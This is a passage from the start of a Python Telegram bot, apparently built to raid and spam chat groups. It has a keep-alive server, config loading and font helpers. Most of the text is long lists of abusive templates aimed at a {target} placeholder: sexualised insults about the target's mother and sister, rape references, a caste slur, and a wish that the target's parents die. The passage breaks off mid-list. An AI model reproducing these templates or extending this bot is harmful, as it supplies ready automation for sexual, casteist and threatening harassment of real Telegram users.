#!/usr/bin/env python3
"""
# KRSNA BHAGWAN - MATRIX CARD EDITION V27 (ULTIMATE 24/7 BULLETPROOF ENGINE)
# Powered by @wjv_1
"""

import asyncio
import json
import os
import random
import signal
import sys
import time
import sqlite3
import threading
import logging
import tracemalloc
import base64 as _b64
from http.server import BaseHTTPRequestHandler, HTTPServer
from telegram import Update, ChatPermissions
from telegram.ext import Application, MessageHandler, filters, ContextTypes
from telegram.error import RetryAfter
import traceback
import io

tracemalloc.start()
BOT_START_TIME = time.time()

# ==================== FIX UNICODE ====================
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# ==================== CONFIG (injected by cli.py) ====================
TOKENS = []              # cli.py will fill this
OWNER_ID = None          # cli.py will fill this
REBRAND = "KRSNA BHAGWAN"  # cli.py will fill this

# Fallback: agar bot.py directly chalao toh config.py se load karo
try:
    from .config_loader import load_config
    _cfg = load_config()
    if _cfg:
        TOKENS = _cfg["TOKENS"]
        OWNER_ID = _cfg["OWNER_ID"]
        REBRAND = _cfg["REBRAND"]
except Exception:
    pass


# ==================== KEEP-ALIVE SERVER (Anti-Sleep) ====================
class KeepAliveHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"KRSNA Matrix Cluster is Alive 24/7")

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def log_message(self, format, *args):
        pass


def run_server():
    port = int(os.environ.get('PORT', 8080))
    try:
        server = HTTPServer(('0.0.0.0', port), KeepAliveHandler)
        server.serve_forever()
    except Exception as e:
        print(f"⚠️ Keep-alive server failed: {e}")


def keep_alive():
    t = threading.Thread(target=run_server)
    t.daemon = True
    t.start()


# ==================== FANCY FONT MAPPING (FORCED) ====================
FANCY_MAP = {
    'a': 'ᴀ','b': 'ʙ','c': 'ᴄ','d': 'ᴅ','e': 'ᴇ','f': 'ғ','g': 'ɢ','h': 'ʜ','i': 'ɪ','j': 'ᴊ','k': 'ᴋ','l': 'ʟ','m': 'ᴍ','n': 'ɴ','o': 'ᴏ','p': 'ᴘ','q': 'ǫ','r': 'ʀ','s': 's','t': 'ᴛ','u': 'ᴜ','v': 'ᴠ','w': 'ᴡ','x': 'x','y': 'ʏ','z': 'ᴢ',
    'A': '𝐀', 'B': '𝐁', 'C': '𝐂', 'D': '𝐃', 'E': '𝐄', 'F': '𝐅', 'G': '𝐆',
    'H': '𝐇', 'I': '𝐈', 'J': '𝐉', 'K': '𝐊', 'L': '𝐋', 'M': '𝐌', 'N': '𝐍',
    'O': '𝐎', 'P': '𝐏', 'Q': '𝐐', 'R': '𝐑', 'S': '𝐒', 'T': '𝐓', 'U': '𝐔',
    'V': '𝐕', 'W': '𝐖', 'X': '𝐗', 'Y': '𝐘', 'Z': '𝐙',
    '0': '𝟎', '1': '𝟏', '2': '𝟐', '3': '𝟑', '4': '𝟒', '5': '𝟓',
    '6': '𝟔', '7': '𝟕', '8': '𝟖', '9': '𝟗'
}


def to_fancy(text):
    return ''.join(FANCY_MAP.get(ch, ch) for ch in str(text))


def format_uptime(seconds):
    m, s = divmod(int(seconds), 60)
    h, m = divmod(m, 60)
    d, h = divmod(h, 24)
    if d > 0: return to_fancy(f"{d}d {h}h {m}m")
    if h > 0: return to_fancy(f"{h}h {m}m {s}s")
    return to_fancy(f"{m}m {s}s")


def make_card(title, lines, version="𝟐𝟕"):
    body = "\n".join([f"│ ⌁ ̼͙̼͙̈́͆̈́ͯ̒̆̀̓ͧ̈́͆̈́ͯ̒̆̀̓ͧ͠͠ᯓ  {to_fancy(line)}" for line in lines])
    return (
        f"ᚔ᚜ 𓆩『𓍼ֶָ֢˖ ࣪ꨄ{to_fancy(REBRAND)} .་༘࿐』𓆪 ᚛ᚔ\n\n"
        f"┌──『𓍼ֶָ֢˖ {to_fancy(title)} ˖ֶָ֢𓍼』──┐\n"
        f"{body}\n"
        f"└────────────────────┘\n\n"
        f"┤ᚔ᚜🐉᚛ᚔ | ━━〔𝐕ᴇʀꜱɪᴏɴ:- {version} 〕━━"
    )


# ⚠️ GITHUB MENU MEDIA URL (GIF / MP4 / IMG) ⚠️
MENU_MEDIA_URL = "https://raw.githubusercontent.com/YOUR_GITHUB_USERNAME/YOUR_REPO_NAME/main/menu_vid.mp4"


# ==================== DATA TEMPLATES ====================
DEFAULT_NC_EMOJIS = ["🪭","🦠","🕯","🫍","🌌","⛓️💥","⚗️","🦪","🦕","🪐","🌀","🌊"]

NC_STYLE_EMOJIS = {
    1: ["🪭","🦠","🕯","🫍","🌌","⛓️💥","⚗️","🦪","🦕","🪐","🌀","🌊"],
    2: ["🫩","😩","🫪","😵","🥶","🤤","😪","🫣"],
    3: ["❤️","🩷","🧡","💛","💚","💙","🩵","💜","🤎","🖤","🩶","🤍"],
    4: ["🐳","🐋","🐬","🦭","🐟","🐠","🐡","🦈","🐙","🦞","🦐","🦑","🐚","🪸"],
    5: ["🌺","🌻","🌼","🌷","🪻","🌱","🥀","🌲","🌳","🌴","🌵","🌾","☘️","🍀"],
    6: ["🕛","🕧","🕐","🕜","🕑","🕝","🕒","🕞","🕓","🕟","🕔","🕠","🕕","🕡"],
    7: ["🌑","🌒","🌓","🌔","🌕","🌖","🌗","🌘","🌚"],
    8: ["☁️","⛅️","⛈️","🌤","🌥","🌦","🌧","🌨","🌩"],
    9: ["⚽️","⚾️","🥎","🏀","🏐","🎱","🪩"],
  10: ["🇦🇩","🇧🇬","🇧🇬","🇬🇷","🇲🇶","🇲🇺","🇷🇺","🏴󠁧󠁢󠁷󠁬󠁳󠁿","🇳🇴"]
}

SYNC_SYMBOLS = ["❅", "⛥", "❂", "𖤓", "𖤐", "⨷", "ꨄ︎", "✹", ".✦ ݁˖", "˚. ᵎᵎ", "˚.🎀༘⋆", "⋆.˚🦋༘⋆"]

ALL_SPAM_TEMPLATES = [

    r'''✨ C̸H̸A̸N̸D̸N̸I̸ R̸A̸A̸T̸ T̸H̸I̸ A̸U̸R̸     {target}   🐕   K̸I̸ M̸A̸A̸ C̸H̸U̸T̸ M̸A̸R̸V̸A̸N̸E̸ M̸E̸R̸E̸ S̸A̸T̸H̸ T̸H̸I̸       ࿐🫧 ________________ C̸H̸A̸N̸D̸N̸I̸ R̸A̸A̸T̸ T̸H̸I̸ A̸U̸R̸     {target}   🐕   K̸I̸ M̸A̸A̸ C̸H̸U̸T̸ M̸A̸R̸V̸A̸N̸E̸ M̸E̸R̸E̸ S̸A̸T̸H̸ T̸H̸I̸       ࿐🫧 ________________ C̸H̸A̸N̸D̸N̸I̸ R̸A̸A̸T̸ T̸H̸I̸ A̸U̸R̸     {target}   🐕   K̸I̸ M̸A̸A̸ C̸H̸U̸T̸ M̸A̸R̸V̸A̸N̸E̸ M̸E̸R̸E̸ S̸A̸T̸H̸ T̸H̸I̸       ࿐🫧 ________________ C̸H̸A̸N̸D̸N̸I̸ R̸A̸A̸T̸ T̸H̸I̸ A̸U̸R̸     {target}   🐕   K̸I̸ M̸A̸A̸ C̸H̸U̸T̸ M̸A̸R̸V̸A̸N̸E̸ M̸E̸R̸E̸ S̸A̸T̸H̸ T̸H̸I̸       ࿐🫧 ________________.''',

    r'''🪽 𝑯𝑰 𝑭𝑨𝑵 ?? 𝒀𝑬 𝑩𝑶𝑳𝑲𝑬     {target}  🐕    𝑲𝑰 𝑴𝑨𝑨 𝑲𝑶 𝑶𝑵𝑳𝒀 𝑭𝑨𝑵𝑺 𝑷𝑬 𝑪𝑯𝑼𝑫𝑾𝑨 𝑫𝑼     ࿐ 🔮 ________________ 𝑯𝑰 𝑭𝑨𝑵 ?? 𝒀𝑬 𝑩𝑶𝑳𝑲𝑬     {target}  🐕    𝑲𝑰 𝑴𝑨𝑨 𝑲𝑶 𝑶𝑵𝑳𝒀 𝑭𝑨𝑵𝑺 𝑷𝑬 𝑪𝑯𝑼𝑫𝑾𝑨 𝑫𝑼     ࿐ 🔮 ________________.''',

    r'''⚡ 𝗠𝗘𝗥𝗔 𝗠𝗔𝗡 𝗠𝗘𝗥𝗜 𝗠𝗔𝗥𝗭𝗜      {target}    🖇️     𝗞𝗜 𝗠𝗔𝗔 𝗖𝗛𝗢𝗗𝗨𝗚𝗔 𝗜𝗡 𝗧𝗢 𝗧𝗛𝗘 𝗗𝗛𝗔𝗥𝗧𝗜        ࿐ 🩷 -------------------------------- 𝗠𝗘𝗥𝗔 𝗠𝗔𝗡 𝗠𝗘𝗥𝗜 𝗠𝗔𝗥𝗭𝗜      {target}    🖇️     𝗞𝗜 𝗠𝗔𝗔 𝗖𝗛𝗢𝗗𝗨𝗚𝗔 𝗜𝗡 𝗧𝗢 𝗧𝗛𝗘 𝗗𝗛𝗔𝗥𝗧𝗜        ࿐ 🩷 --------------------------------.''',

    r'''🪐 {target} ---------------------------------------------चुदी ---------------BY ------------__[__𓆰『⊰ ˚𓍼 ꨄ𝐊𝐑𝐒𝐍𝐀 ᯓ 🪽』_𓆪__]__ 😂 {target} ____Ki____MAA>>BHEN ---------------------------------------------चुदी ---------------BY ------------__[__𓆰『⊰ ˚𓍼 ꨄ𝐊𝐑𝐒𝐍𝐀 ᯓ 🪽』_𓆪__]__ 😂.''',

    r'''🌙 𝑂𝑌𝑌 𝐶𝐻𝑂𝐷𝑈𝐺𝐴 𝐴𝐵 𝑀𝐸       {target}    🦕     𝐾𝐼 𝑀𝐴𝐴 𝐾𝑂 𝐵𝐴𝑁𝐴𝐾𝐸 𝑅𝑈𝑁𝐷𝑌 𝑂𝐹 𝑇𝐻𝐸 𝑌𝐸𝐴𝑅         ࿐ 🎀 °°°°°°°°°°°°°°°°°°°°°°°° 𝑂𝑌𝑌 𝐶𝐻𝑂𝐷𝑈𝐺𝐴 𝐴𝐵 𝑀𝐸       {target}    🦕     𝐾𝐼 𝑀𝐴𝐴 𝐾𝑂 𝐵𝐴𝑁𝐴𝐾𝐸 𝑅𝑈𝑁𝐷𝑌 𝑂𝐹 𝑇𝐻𝐸 𝑌𝐸𝐴𝑅         ࿐ 🎀 °°°°°°°°°°°°°°°°°°°°°°°°.''',

    r'''💫 𝑯𝑰 𝑭𝑨𝑵 ?? 𝒀𝑬 𝑩𝑶𝑳𝑲𝑬     {target}  🐕    𝑲𝑰 𝑴𝑨𝑨 𝑲𝑶 𝑶𝑵𝑳𝒀 𝑭𝑨𝑵𝑺 𝑷𝑬 𝑪𝑯𝑼𝑫𝑾𝑨 𝑫𝑼     ࿐ 🔮 ________________ 𝑯𝑰 𝑭𝑨𝑵 ?? 𝒀𝑬 𝑩𝑶𝑳𝑲𝑬     {target}  🐕    𝑲𝑰 𝑴𝑨𝑨 𝑲𝑶 𝑶𝑵𝑳𝒀 𝑭𝑨𝑵𝑺 𝑷𝑬 𝑪𝑯𝑼𝑫𝑾𝑨 𝑫𝑼     ࿐ 🔮 ________________.''',

    r'''🧿 𝗠𝗘𝗥𝗔 𝗠𝗔𝗡 𝗠𝗘𝗥𝗜 𝗠𝗔𝗥𝗭𝗜      {target}    🖇️     𝗞𝗜 𝗠𝗔𝗔 𝗖𝗛𝗢𝗗𝗨𝗚𝗔 𝗜𝗡 𝗧𝗢 𝗧𝗛𝗘 𝗗𝗛𝗔𝗥𝗧𝗜        ࿐ 🩷 -------------------------------- 𝗠𝗘𝗥𝗔 𝗠𝗔𝗡 𝗠𝗘𝗥𝗜 𝗠𝗔𝗥𝗭𝗜      {target}    🖇️     𝗞𝗜 𝗠𝗔𝗔 𝗖𝗛𝗢𝗗𝗨𝗚𝗔 𝗜𝗡 𝗧𝗢 𝗧𝗛𝗘 𝗗𝗛𝗔𝗥𝗧𝗜        ࿐ 🩷 --------------------------------.''',

    r'''🐉 𝑯𝑰 𝑭𝑨𝑵 ?? 𝒀𝑬 𝑩𝑶𝑳𝑲𝑬     {target}  🐕    𝑲𝑰 𝑴𝑨𝑨 𝑲𝑶 𝑶𝑵𝑳𝒀 𝑭𝑨𝑵𝑺 𝑷𝑬 𝑪𝑯𝑼𝑫𝑾𝑨 𝑫𝑼     ࿐ 🔮 ________________ 𝑯𝑰 𝑭𝑨𝑵 ?? 𝒀𝑬 𝑩𝑶𝑳𝑲𝑬     {target}  🐕    𝑲𝑰 𝑴𝑨𝑨 𝑲𝑶 𝑶𝑵𝑳𝒀 𝑭𝑨𝑵𝑺 𝑷𝑬 𝑪𝑯𝑼𝑫𝑾𝑨 𝑫𝑼     ࿐ 🔮 ________________.''',

    r'''💎 𝑂𝑌𝑌 𝐶𝐻𝑂𝐷𝑈𝐺𝐴 𝐴𝐵 𝑀𝐸       {target}    🦕     𝐾𝐼 𝑀𝐴𝐴 𝐾𝑂 𝐵𝐴𝑁𝐴𝐾𝐸 𝑅𝑈𝑁𝐷𝑌 𝑂𝐹 𝑇𝐻𝐸 𝑌𝐸𝐴𝑅         ࿐ 🎀 °°°°°°°°°°°°°°°°°°°°°°°° 𝑂𝑌𝑌 𝐶𝐻𝑂𝐷𝑈𝐺𝐴 𝐴𝐵 𝑀𝐸       {target}    🦕     𝐾𝐼 𝑀𝐴𝐴 𝐾𝑂 𝐵𝐴𝑁𝐴𝐾𝐸 𝑅𝑈𝑁𝐷𝑌 𝑂𝐹 𝑇𝐻𝐸 𝑌𝐸𝐴𝑅         ࿐ 🎀 °°°°°°°°°°°°°°°°°°°°°°°°.''',

    r'''🔱 𝗣𝗔𝗡𝗧𝗬 𝗠𝗘 𝗧𝗛𝗔 𝗖𝗛𝗘𝗗     {target}    😭     𝗞𝗜 𝗠𝗔𝗔 𝗖𝗛𝗢𝗗𝗡𝗔 𝗜𝗦 𝗡𝗢𝗧 𝗦𝗔𝗙𝗘      ࿐ 💅🏻 ________________ 𝗣𝗔𝗡𝗧𝗬 𝗠𝗘 𝗧𝗛𝗔 𝗖𝗛𝗘𝗗     {target}    😭     𝗞𝗜 𝗠𝗔𝗔 𝗖𝗛𝗢𝗗𝗡𝗔 𝗜𝗦 𝗡𝗢𝗧 𝗦𝗔𝗙𝗘      ࿐ 💅🏻 ________________.'''
]

TSPAM_STYLE_TEMPLATES = {
    1: ALL_SPAM_TEMPLATES[:3],
    2: ALL_SPAM_TEMPLATES[3:6],
    3: ALL_SPAM_TEMPLATES[6:]
}

ATTACK_NC_PATTERNS = [
    "⚡ 『{target}』 𝐊𝐈 𝐌𝐀𝐀 𝐂𝐇𝐔𝐃𝐈 𝐁𝐘 𝐊𝐑𝐒𝐍𝐀 ⚡",
    "𓆩 𝐊𝐑𝐒𝐍𝐀 𝐏𝐀𝐏𝐀 𝐍𝐄 『{target}』 𝐊𝐎 𝐏𝐄𝐋𝐀 𓆪",
    "💀 『{target}』 𝐂𝐇𝐀𝐓 𝐌𝐀𝐙𝐃𝐔𝐑 𝐑𝐀𝐍𝐃𝐈 💀",
    "🔥 𝐌𝐀𝐊𝐀 𝐁𝐇𝐒𝐎𝐃𝐀  𝐇𝐀𝐍𝐆 『{target}』 𝐊𝐀 🔥",
    "👑 𝐊𝐑𝐒𝐍𝐀 𝐎𝐍 𝐓𝐎𝐏 ☬ 『{target}』 𝐊𝐈 𝐌𝐊𝐁 👑"
]

SLIDE_TEXTS = [
    "MAHORAHA ᴏᴘ ʙᴏʟ Nyto aaj try ma confirm chudegi😅💔😅💔😅💔",
    "Try maa rndy h maan le cp ka bahana deke mt ja 😭💥😭💥😭😭😭🔥",
    "Idr aa tmkc me muth maru 👺❤️‍🩹👺❤️‍🩹👺",
    "Idr aa try maa rndy bro",
    "Apni Maa Ki Chutt 𝙆𝙃𝘼𝙇𝙀 कुतिया के लड़के 🤮🤮🖕🏻🖕🏻",
    "Aurato ka kam roti bna na hota h tho Teri ma yaha kyu cudrhi🤬🤣😭😂🙏🏽💔💯🎈",
    "( Chal Tatte Try Maa Ko Pyramid Me Chodu~🤍",
    "𝐂ʜᴀʟ  𝙆𝙐𝙏𝙏𝙄𝙔𝘼 ᴋɪ 𝑨𝑼𝑳𝑨𝐷 𝐏ᴀᴠ 👉🦵 ᴾᴬᴷᴬᴰ 🔥 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐂ʜᴜᴅᴋᴇ 𝐁ʜᴀᴀɢ 𝐑ᴀʜɪ -----> 🏃🏻‍♀️🔥🤸🏻‍♀️🔥🏃🏻‍♀️🔥🤸🏻‍♀️🔥",
    "say 𝐊𝐑𝐒𝐍𝐀 Baap 🦍",
    " ᵀᵐᴷᶜ」🦋꙰  ~ ༈  ◠🇮🇳◡",
    " Teri माँ Dead 😂 ",
    " ᴛᴇʀᴀ ʙᴀᴀᴘ ᴄᴀʀᴘᴀɴᴛᴇʀ 🪚",
    " ᴛʀʏ ᴅᴀᴅɪ sʟᴜᴛ⚀︎",
    " ʏᴏᴜʀ ᴍᴏᴍ ᴡʜᴏʀᴇ👞",
    " ɢᴜʟᴀᴍ ɢᴀɴᴅ ᴋᴀ ᴊᴏʀ ʟɢᴀ😆",
    " ᴛᴇʀᴀ ʙᴀᴀᴘ 𝐊𝐑𝐒𝐍𝐀 😼",
    " ᴛᴇʀʏᴍᴀ ᴡᴇᴅs 𝐊𝐑𝐒𝐍𝐀🍇",
    " ʀɴᴅɪ ᴋᴀ ʟᴅᴄᴀ🍑",
    " ʜᴠᴀʙᴀᴀᴢ ᴄʜᴜᴅᴋᴇ ᴍʀᴀ🧖",
    " ʀᴀɴᴅɪ ᴋɪ ᴘᴀɪᴅᴀɪsʜ💔",
    " ᴄʜᴜᴅ ɢʏɪ ᴍᴀᴀ ᴛᴇʀɪ 🤣",
    " ᴀʙʙᴜ ʙᴏʟ 𝐊𝐑𝐒𝐍𝐀 ᴋᴏ 😈",
    " ᴛᴇʀɪ ʙᴇʜᴇɴ ᴍᴇʀɪ ғᴀɴ 🥵",
    " ᴅᴇᴋʜ 𝐊𝐑𝐒𝐍𝐀 ᴋɪ ᴘᴏᴡᴇʀ 💪",
    " ᴀʙʙᴇ ɴᴀʟʟᴇ sᴜᴅʜᴀʀ ᴊᴀ 🤬",
    " ᴛᴇʀᴀ ᴋʜᴀɴᴅᴀᴀɴ ᴄʜᴜᴅ ɢʏᴀ 💀",
    " ᴛᴇʀᴇ 𝐊𝐑𝐒𝐍𝐀 ᴘᴀᴘᴀ ᴀᴀʏᴇ ʜ 🦁",
    " ʙʜᴀᴀɢ ʙʜᴏsᴅɪᴋᴇ ʙʜᴀᴀɢ 🏃",
    " ᴛᴇʀɪ ᴍᴀᴀ ᴋᴀ ʙʜᴏsᴅᴀ 😹",
    " ɢᴀᴀɴᴅ ғᴀᴛᴛ ɢʏɪ? 🥺",
    " ᴋᴀ sʏsᴛᴇᴍ ʜᴀɴɢ ʙʏ 𝐊𝐑𝐒𝐍𝐀 💻",
    " ᴛᴇʀᴀ ʙᴀᴀᴘ ᴀᴀʏᴀ 🤬",
    " ᴍᴀᴀ ᴄʜᴜᴅᴀ ʟᴏᴅᴇ 🍑",
    " ʀᴀɴᴅɪ ʀᴏɴᴀ ᴍᴀᴛ ᴋᴀʀ 😭",
    " ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴜᴛ ᴍᴇ ᴘᴀɪʀ 🦶",
    " 𝐊𝐑𝐒𝐍𝐀 ᴏɴ ᴛᴏᴘ 🔝",
    " ᴄʜᴀʟ ɴɪᴋᴀʟ ʟᴏᴅᴇ 🚪",
    " ᴛᴇʀɪ ᴍᴀᴀ ᴋᴀ ʀᴀᴘᴇ 🔞",
    " sᴀʏ 𝐊𝐑𝐒𝐍𝐀 ɪs ɢᴏᴅ ⚡",
    " ʙᴏᴛs ᴀʀᴇ ғᴜᴄᴋɪɴɢ ʏᴏᴜ 🤖",
    " ᴛᴇʀᴀ ʙᴀᴀᴘ ʜᴜ ᴍᴀɪ 🎅",
    " ᴀᴜᴋᴀᴀᴛ ᴍᴇ ʀᴇʜ 🤬",
    " ɢᴀᴀɴᴅ ᴍᴇ ᴅᴀɴᴅᴀ ᴅᴇ ᴅᴜɴɢᴀ 🎋",
    " ᴄʜᴜᴘ ᴋᴀʀ ʀᴀɴᴅɪ 🤫",
    " ᴛᴇʀɪ ʙᴇʜᴇɴ ᴄʜᴜᴅ ɢʏɪ 💃",
    " ᴅᴇᴋʜ 𝐊𝐑𝐒𝐍𝐀 ᴋᴀ ᴋʜᴀᴜғ 😈",
    " ʙʜᴀᴀɢ ᴍᴀᴛ ʀᴀɴᴅɪ 🏃‍♀️",
    " ᴛᴇʀᴀ ɢʜᴀʀ ᴊᴀʏᴇɢᴀ 🏠",
    " ᴍᴀᴀ ᴄʜᴜᴅᴀ ᴀᴘɴɪ 🖕",
    " 𝐊𝐑𝐒𝐍𝐀 ᴏᴘ ʙᴏʟᴛᴇ 🔥",
    " sʏsᴛᴇᴍ ᴘʜᴀᴀᴅ ᴅᴇɴɢᴇ 💥",
    " ᴛᴇʀɪ ɢᴀᴀɴᴅ ʟᴀᴀʟ 🔴",
    " ʙᴏʟ ɴᴀ ᴍᴀᴅᴀʀᴄʜᴏᴅ 🗣️",
    " ʙᴏʟ 𝐊𝐑𝐒𝐍𝐀 ᴋɪ ᴊᴀɪ 🇮🇳",
    "𝘾𝙔𝙐 𝙍𝙀 𝙍𝙉𝘿𝙔𝙆𝙀 𝘽𝘼𝘼𝙋 𝙎𝙀 𝘽𝙃𝙄𝘿𝙉𝙀 𝘼𝘼 𝙂𝙔𝘼?",
    "𝘾𝙃𝙇 𝘾𝙃𝙐𝘿 𝘼𝘽 𝙍𝙉𝘿 𝙆𝙀 𝙋𝙄𝙇𝙀𝙀",
    "𝙏𝙍𝙔 𝙈𝘼 𝙆𝙊 𝐊𝐑𝐒𝐍𝐀 𝘼𝘽𝘽𝙐 𝙋𝙀𝙇𝙀",
    "𝘾𝙃𝙐𝘿𝙂𝙀𝙂𝘼 𝙎𝘼𝘼𝙇 𝘽𝙃𝙍 𝙏𝙐𝙏𝙊 𝘽𝙀𝙏𝘼 🍑",
    "𝙔𝙀𝙃 𝙂𝙍𝙀𝙀𝙑 𝙁𝙔𝙏𝙀𝙍 𝙄𝙎𝙆𝙄 𝙈𝙆𝘽",
    "𝙃𝙑𝘼𝘽𝘼𝘼𝙕 𝘽𝘼𝙉𝙀𝙂𝘼 𝙏𝙈𝙍",
    "𝙅𝙇𝘿𝙄 𝙅𝙇𝘿𝙄 𝘾𝙃𝙐𝘿 𝐊𝐑𝐒𝐍𝐀 𝘼𝘽𝘽𝙐 𝘽𝙐𝙎𝙎𝙔 𝙃𝘼𝙄",
    "𝘾𝙑𝙍 𝙆𝙍 𝙈𝘼𝙅𝘽𝙐𝙍𝙄𝙔𝘼 𝙉𝘼 𝙎𝙐𝙉𝘼",
    "𝙏𝙀𝙍𝙄 𝙈𝘼 𝙆𝘼 𝙋𝘼𝙏𝙄 𝐊𝐑𝐒𝐍𝐀 𝙃𝘼𝙄",
    "𝘽𝙃𝘼𝘼𝙂 𝙈𝘼𝙏 𝙋𝙄𝙇𝙇𝙀 𝙊𝙔𝙀",
    "𝘼𝘽𝙀 𝙇𝙊𝘿𝙐 𝙏𝙀𝙍𝙄 𝙂𝘼𝙉𝘿 𝙈𝙀 𝘿𝘼𝙉𝘿𝘼",
    "𝐊𝐑𝐒𝐍𝐀 𝙊𝙉 𝙏𝙊𝙋 𝘽𝘼𝘽𝙔",
    "𝙏𝙀𝙍𝙄 𝙈𝘼 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙈𝙀 𝘽𝙊𝙏 𝙆𝘼 𝙇𝙐𝙉𝘿",
    "𝘽𝙃𝘼𝂂 𝘽𝙃𝙊𝙎𝘿𝙄𝙆𝙀 𝘽𝙃𝘼𝂂",
    "𝘼𝙋𝙉𝙄 𝘼𝙈𝙈𝙄 𝙆𝙊 𝘽𝙃𝙀𝙅 𝙋𝘼𝙉𝙄 𝙉𝙄𝙆𝘼𝙇𝙉𝘼 𝙃",
    "𝙏𝙀𝙍𝘼 𝙆𝙃𝘼𝙉𝘿𝘼𝙉 𝙆𝙃𝘼𝙏𝘼𝙈",
    "𝐊𝐑𝐒𝐍𝐀 𝙆𝙄 𝘿𝙀𝙃𝙎𝙃𝘼𝙏",
    "𝘽𝘼𝘼𝙋 𝙎𝙀 𝘽𝘼𝙆𝘾𝙃𝙊𝘿𝙄 𝙉𝙃𝙄",
    "𝙏𝙀𝙍𝙄 𝙈𝘼 𝙆𝙊 𝘾𝙃𝙊𝘿 𝘿𝙐𝙉𝙂𝘼",
    "𝙍𝘼𝙉𝘿𝙄 𝙆𝙀 𝘽𝘼𝘾𝘾𝙃𝙀",
    "𝘼𝐐𝘼𝙏 𝙈𝙀 𝙍𝙀𝙃 𝙇𝙊𝘿𝙀",
    "𝙏𝙀𝙍𝘼 𝘽𝘼𝘼𝙋 𝙃𝙐 𝙈𝘼𝙄",
    "𝘾𝙃𝘼𝙇 𝙉𝙄𝙆𝘼𝙇 𝘽𝙃𝙊𝙎𝘿𝙄𝙆𝙀",
    "𝙏𝙀𝙍𝙄 𝙈𝘼 𝙆𝘼 𝘽𝙃𝙊𝙎𝘿𝘼",
    "𝐊𝐑𝐒𝐍𝐀 ??𝙎 𝙂𝙊𝘿",
    "𝙏𝙀𝙍𝙄 𝙂𝘼𝘼𝙉𝘿 𝙁𝘼𝘼𝘿 𝘿𝙐𝙉𝙂𝘼",
    "𝙈𝘼𝘼 𝘾𝙃𝙐𝘿𝘼 𝘼𝙋𝙉𝙄",
    "     𝐊ʏᴜ 𝐑ᴇ 𝐑ᴀɴᴅɪ 𝐌𝐀 ᴋᴇ 𝐋ᴀᴅᴄᴏ 𝐊𝐑𝐒𝐍𝐀 ᴀʙʙᴜ 𝐊ᴏ 𝐃ʙᴀ. ɴʜɪ 𝐏ᴀʀᴇ ᴄʏᴀ??🤬",
    "तू छोटा था तब तेरी मां का स्तन पान करता था मैं, उसके दूध में 60% क्रीम होता था, तू रोते हुए आता था और मैं तुझे लात मारके भागता था बोलता था हट साले मेरे लन्ड से निकले हुए मैल",
    "This message cannot be seen because you are randy",
    "GRIB MA K BACHAY GHAR ME ATTA LE AA HATER कामज़ोर KA BAAP 𝐊𝐑𝐒𝐍𝐀 सरकार",
    "घिनौनी रंडी के बच्चे तु बात बात पर अपनी माँ क्यूँ चुदवाता है मादरचोद",
    "Chup kali maa ke रण्डी बच्चे",
    "Chl Harmzadi Ke लड़के",
    "Trymaa ki chut mein labubu",
    "khadi ho ब्राह्मण guru दक्षिणा me mera lund pakad",
    "Teri माँ के भोसड़े पर इतने बल्ले मारूंगा की IPL जीत जायेगी",
    "Dar mat pagli bas piche se karenge",
    "काले Doraemon रोता reh",
    "NEKAL MADARCHOD",
    "Yar apni ma mt nungy kr",
    "randycy तेरी माँ ke बुर me न्युक phod dunga",
    "end portal bn gya ab try ma iske andar chudegi",
    "Teri takli maa ke sar pr per rkhkr bolunga jutte saaf kr rndy",
    "jhutt bolke bachega tmkc Rndyke",
    "क्या रे Chai Wale Ke Ladke बनाऊ तुझे Fyter",
    "Teri mummy or papa kal accident me mar jaye",
    "जब मैं तेरी माँ को जम कर चोदूंगा तो तेरी माँ रहम की भीख मांगेगी Samjha",
    "oye rndi ke ldke भगा to teri maa चमार जाति ki राँड",
    "सुबह शाम Teri माँ नंगी होगी",
    "क्या सोचा है तेरे जैसे MajDuR के लिए अपना TiMe wAsTe करुंगा Eww निकाल MaDaRchOd के धुर",
    "CHUP RNDIKE",
    "100% TERI MAA KA GULABHI BOSHDA HACK KARLIYA",
    "तुझ जैसे लोगो की Maa Ki Chut Mein अम्बुजा Cement से majboot ghar bna dena chahiye",
    "tri ma रंग बिरंगी रंडी",
    "चुप तेरी नानी का भोसड़ा",
    "तेरी माँ की चुत में ok"
]

RAID_SUBJECT_LIMIT = 200
RAID_TOP_EMOJIS = ['🪭','🦠','🕯','🫍','🌌','⛓️💥','⚗️','🦪','🦕','🪐','🌀','🌊']
RAID1_FACE_EMOJIS = ['🫩','😩','🫪','😵','🥶','🤤','😪','🫣']
RAID2_FRUITS = ['🍈','🌶️','🥭','🍆','🍌','🥒','🍓','🌽','🍇','🌵',
    '🍉','🍊','🍋','🍍','🥝','🍎','🍏','🍑','🍒','🍅','🥑','🫐','🍐','🥥','🍠',
    '🫑','🥦','🥕','🧅','🧄','🥬','🍄','🫛','🥔','🫒','🌰','🥜','🫘','🫚']
RAID3_LINES = [
    '{target} 𝐊𝐎 𝐏𝐄𝐋𝐓𝐄 𝐇𝐔𝐄 𝐊𝐑𝐒𝐍𝐀 𝐏𝐀𝐏𝐀 𝐊𝐈 𝐄𝐍𝐓𝐑𝐘😎❤️‍🔥',
    '{target} 𝐂𝐇𝐀𝐋 𝐀𝐁 𝐊𝐑𝐒𝐍𝐀 𝐏𝐀𝐏𝐀 𝐁𝐎𝐋 𝐆𝐔𝐋𝐀𝐌🤣🩷🤚??',
    '{target} 𝐑𝐄𝐏𝐋𝐘 𝐊𝐀𝐑 𝐆𝐀𝐑𝐈𝐁 𝐃𝐀𝐑 𝐊𝐘𝐔 𝐑𝐀𝐇𝐀 𝐇?😂🤙🏼🤍',
    '{target} 𝐂𝐇𝐀𝐋 𝐓𝐄𝐑𝐈 𝐌𝐀 𝐂𝐇𝐎𝐃𝐔 𝐏𝐀𝐓𝐀𝐊 𝐏𝐀𝐓𝐀𝐊 𝐊𝐄🤣👻🩶',
    '{target} 𝐂𝐇𝐀𝐓 𝐌𝐀𝐙𝐃𝐔𝐑𝐈 𝐊𝐀𝐈𝐒𝐄 𝐑𝐔𝐊𝐈 𝐓𝐄𝐑𝐈 𝐁𝐀𝐔𝐍𝐄?🤣🩵🙌🏼',
